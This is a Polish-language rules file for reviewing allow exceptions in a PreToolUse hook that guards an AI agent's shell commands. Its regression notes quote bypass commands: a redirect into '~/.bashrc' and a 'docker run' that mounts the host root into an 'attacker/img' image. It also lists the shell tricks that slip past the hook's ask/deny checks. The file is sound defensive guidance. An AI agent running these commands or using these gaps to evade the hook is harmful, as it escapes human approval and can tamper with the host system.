---
paths:
  - "plugin/hooks/**"
  - ".claude/hooks/**"
---

# Allow w hooku: minimalny, dokładny i fail-closed

Każdy wyjątek „allow” w hooku PreToolUse (`plugin/hooks/bash_guard.py`, `.claude/hooks/*`) otwiera drogę obok reguł deny/ask. Wyjątek, który przepuszcza więcej niż deklaruje, jest luką bezpieczeństwa, a nie wygodą: agent dostaje zapis albo wykonanie kodu bez pytania.

## Rule

1. **Allow-lista, nie denylista.** Allow obejmuje dokładnie wymieniony zestaw podkomend i flag (np. `ruff check --no-fix`, `ruff format --check|--diff`). Każda inna flaga, także prefiks długiej opcji (`--fi`), wraca na normalną ścieżkę reguł. Nie wyliczaj flag niebezpiecznych.
2. **Allow tylko w gałęzi właściwej roli.** Wyjątek dla subagenta stoi w gałęzi subagenta (`if is_subagent and ...`), nie przed rozgałęzieniem na role. Sesja główna zachowuje swoje `ask` i flagi `MONOLYNX_AUTO*`.
3. **Odrzuć każdą składnię powłoki, która zmienia znaczenie komendy poza widocznymi tokenami:** `|`, `;`, `&`, `&&`, `$(`, backtick, nowa linia i `\r`, przekierowania `<` / `>` (także `1>` i doklejone), a `$` / `~` / glob w KAŻDYM tokenie, w tym w wartościach flag prefiksu.
4. **Prefiks kontenera ze stałym serwisem, bez dowolnego obrazu.** Dozwolone tylko `docker compose exec [-T] <serwis>` i `docker compose ... run ... <serwis>` ze stałą nazwą serwisu. `docker run <obraz>` nigdy nie jest allow (ENTRYPOINT obrazu wykonuje dowolny kod). W `compose run` odrzuć `--entrypoint`, `--privileged`, `-u/--user`, a `-v` dopuszczaj tylko jako `<literalna ścieżka pod korzeniem projektu>:<workdir>`.
5. **„Read-only” sprawdzone wobec konfiguracji konsumenta.** Komenda jest read-only tylko wtedy, gdy nie zmieni plików przy żadnej konfiguracji projektu (np. `ruff check` z `fix = true` w `pyproject.toml` pisze; `--no-fix` to nadpisuje).
6. **Każdy odrzucany wariant ma test.** Dla każdego prefiksu i każdej klasy składni z pkt 3-4 jest przypadek deny (subagent) albo ask (sesja główna) w `tests/unit/test_bash_guard.py`, także dla sesji głównej bez `MONOLYNX_AUTOTEST`.

## Pitfall

Allow pisany pod konkretny przypadek użycia („subagent chce odpalić ruff”) testuje się przypadkami pozytywnymi. Luki siedzą w wariantach, których nikt nie wpisał do testów: przekierowanie, obcy obraz, bind mount hosta, rola, dla której wyjątek nie był przeznaczony. Krytyk znajduje je dopiero probem różnicowym (te same komendy na wersji przed i po zmianie).

## Regression

- MON-176: pierwsza wersja `is_readonly_ruff` przepuszczała `ruff check src/ > ~/.bashrc` i nie sprawdzała `$` / `~` / glob w wartościach flag prefiksu dockera (-10, -5).
- MON-207 (code review MR !98): ten sam wyjątek przepuszczał `docker run --rm -v /:/host attacker/img ruff check` (zapis na hoście przez ENTRYPOINT), traktował goły `ruff check` jako read-only mimo `fix = true` u konsumenta i działał także dla sesji głównej, więc ruff leciał bez `ask` wbrew kontraktowi hooka. Trzy punkty blokujące merge sprintu.

## What to check

- Nowy lub zmieniony warunek allow w hooku -> czy stoi w gałęzi roli, dla której jest przeznaczony.
- Allow oparty na liście flag zabronionych zamiast dozwolonych.
- Prefiks `docker run`, `--entrypoint`, `--privileged`, `-v` z dowolną ścieżką hosta w komendzie, która dostaje allow.
- Brak przypadku deny/ask w testach dla przekierowania, komendy złożonej, ekspansji w wartości flagi i sesji głównej bez flagi AUTO*.
